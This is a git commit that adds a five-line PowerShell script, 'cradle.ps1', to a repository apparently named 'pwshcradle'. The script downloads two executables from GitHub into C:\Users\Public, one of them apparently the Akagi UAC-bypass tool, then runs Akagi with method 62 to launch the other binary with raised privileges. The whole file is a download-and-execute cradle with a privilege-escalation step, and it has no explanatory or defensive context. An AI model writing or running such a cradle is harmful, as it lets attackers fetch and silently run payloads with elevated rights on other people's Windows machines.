50420a9484cb2303478c27812b4a7e6e91537d5a
Brothersextremegaming <125992368+Brothersextremegaming@users.noreply.github.com>
2026-02-24 08:37:40 +0530

    Add files via upload

---
+++ cradle.ps1
@@ -0,0 +1,5 @@
+wget https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipient.exe -o 62 C:\Users\Public\demo.exe
+
+wget https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe -o 62 C:\Users\Public\Akagi.exe
+
+C:\Users\Public\Akagi.exe 62 C:\Users\Public\demo.exe
